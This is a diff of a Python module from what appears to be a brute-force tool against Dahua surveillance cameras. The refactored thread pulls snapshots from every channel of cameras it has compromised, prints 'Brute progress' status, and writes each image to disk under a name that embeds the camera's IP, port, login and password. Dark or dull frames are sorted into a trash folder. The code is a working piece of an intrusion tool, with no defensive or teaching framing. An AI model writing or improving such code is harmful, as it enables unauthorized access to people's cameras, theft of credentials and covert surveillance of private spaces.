@@ -1,10 +1,10 @@
 # -*- coding:utf-8 -*-
-
 import threading
+import queue
 import logging
 import sys
 import io
-import os
+from pathlib import PurePath
 
 from time import sleep
 from PIL import Image
@@ -15,12 +15,12 @@ from cv2 import COLOR_BGR2GRAY, bilateralFilter
 from paint import *
 import config
 
-
 class ScreenshotThread(threading.Thread):
-    def __init__(self, screenshot_queue, image_processing_queue):
+    def __init__(self, screenshot_queue):
         threading.Thread.__init__(self)
+
         self.screenshot_queue = screenshot_queue
-        self.image_processing_queue = image_processing_queue
+        self.trash_counter = 0
 
     def run(self):
         while True:
@@ -31,49 +31,48 @@ class ScreenshotThread(threading.Thread):
             self.screenshot_queue.task_done()
 
     def make_snapshots(self, dahua):
-        model = dahua.model
-        channels_count = dahua.channels_count
-        logging.debug(f' Make snapshot from {dahua.ip} (DM: {dahua.model}, channels: {channels_count})')
-        config.trash_cam[dahua.ip] = 0
+        logging.debug(f'Make snapshot from {dahua.ip} (DM: {dahua.model}, channels: {dahua.channels_count})')
+        self.trash_counter = 0
         dead_counter = 0
-        capturing = 0
         total_channels = config.ch_count
-        for channel in range(channels_count):
-            # Ускорение / Performance
-            if dead_counter > 4 or config.trash_cam[dahua.ip] > 2:
-                logging.debug(f' {dead_counter} dead channels in a row. Skipping this cam')
+
+        for channel in range(dahua.channels_count):
+            if dead_counter > 4:
+                logging.debug(f'{dead_counter} dead channels in a row. Skipping this cam')
                 break
+            if self.trash_counter > 2:
+                logging.debug(f'{self.trash_counter} trash channels in a row. Skipping this cam')
+                break
+                
             try:
-                jpeg = dahua.get_snapshot(channel)
-                dead_counter = 0
-                capturing += 1
-                name = f"{dahua.ip}_{dahua.port}_{dahua.login}_{dahua.password}_{channel + 1}_{model}.jpg"
-                grabster = channels_count - capturing
-                print(fore_green(f"Brute progress: [{config.state}] Grabbing snapshots for {dahua.ip}.. \n")  # Left {str(grabster)} channels.. Trash: {str(config.trash_cam[dahua.ip])}\n")
-                + back_yellow(f"Writing snapshots.. Total saved {config.snapshots_counts} from {total_channels}"), end='\r')
-                sleep(0.05)
-                self.image_processing_queue.put([name, jpeg], block=False, timeout=20)
-                # self.image_processing(jpeg)
+                snapshot = dahua.get_snapshot(channel)
             except Exception as e:
-                logging.debug(f' Channel {channel + 1} of {dahua.ip} is dead {str(e)}{" "*40}')
+                logging.debug(f'Channel {channel + 1} of {dahua.ip} is dead: {str(e)}')
                 dead_counter += 1
                 continue
-        logging.debug("%s exit from make_snapshots()" % dahua.ip)
-        return
+            dead_counter = 0
+            
+            print(fore_green(f'Brute progress: [{config.state}] Grabbing snapshots for {dahua.ip}.. \n')
+                + back_yellow(f'Writing snapshots.. Total saved {config.snapshots_counts} from {total_channels}'), end='\r')
+            sleep(0.05)
 
+            name = f"{dahua.ip}_{dahua.port}_{dahua.login}_{dahua.password}_{channel + 1}_{dahua.model}.jpg"
+            try:
+                if self.is_trash(snapshot):
+                    self.trash_counter += 1
+                    self.save_image(PurePath('trash', name), snapshot)
+                else:
+                    self.trash_counter = 0
+                    self.save_image(name, snapshot)
+            except Exception as e:
+                logging.debug(f'{fore_red(f"Cannot open snapshot: {str(e)}")}')
+            
+        logging.debug(f'{dahua.ip} exit from make_snapshots()')
 
-class ImageProcessingThread(threading.Thread):
-    def __init__(self, image_processing_queue):
-        threading.Thread.__init__(self)
-        self.image_processing_queue = image_processing_queue
-
-    def run(self):
-        while True:
-            with threading.Lock():
-                # print(self.image_processing_queue.get())
-                name, image = self.image_processing_queue.get()
-            self.processing(name, image)
-            self.image_processing_queue.task_done()
+    def is_trash(self, snapshot):
+        pil_image = Image.open(io.BytesIO(snapshot))
+        image = np.array(pil_image)
+        return self.is_dark(image) and not self.is_interesting(image)
 
     def is_dark(self, image):
         x = np.sum(image)/image.size
@@ -91,35 +90,12 @@ class ImageProcessingThread(threading.Thread):
         else:
             return True
 
-    def processing(self, name, image_bytes):
-        n_name = name.split("_")
-        n_ip = n_name[0]
-        try:
-            pil_image = Image.open(io.BytesIO(image_bytes))
-            image = np.array(pil_image)
-            if self.is_dark(image) or not self.is_interesting(image):
-                self.save_image(os.path.join('trash', name), image_bytes)
-                config.trash_cam[n_ip] += 1
-                return False
-            else:
-                self.save_image(name, image_bytes)
-                config.trash_cam[n_ip] = 0
-                return True
-        except Exception as e:
-            config.trash_cam[n_ip] += 1
-            #print("PIL Issue: " + str(e))
-            logging.debug(f'{fore_red("Cannot save screenshot")} - {name.split("_")[0]} - {back_red("CORRUPTED FILE")}{" "*40}')
-            pass
-
     def save_image(self, name, image_bytes):
-        n_name = name.split("_")
-        n_ip = n_name[0]
         try:
-            with open(os.path.join(config.snapshots_folder, name), 'wb') as outfile:
+            with open(PurePath(config.snapshots_folder, name), 'wb') as outfile:
                 outfile.write(image_bytes)
             config.snapshots_counts += 1
-            logging.debug(f' {fore_green(f"Saved snapshot - {name}")}{" "*40}')
+            logging.debug(f'{fore_green(f"Saved snapshot - {name}")}')
         except Exception as e:
-            config.trash_cam[n_ip] += 1
-            #print(" Outfile: " + e)
-            logging.debug(f'{fore_red("Cannot save screenshot")} - {name}{" "*40}')
+            self.trash_counter += 1
+            logging.debug(f'{fore_red(f"Cannot save snapshot - {name}:")} {back_red(f"{str(e)}")}')
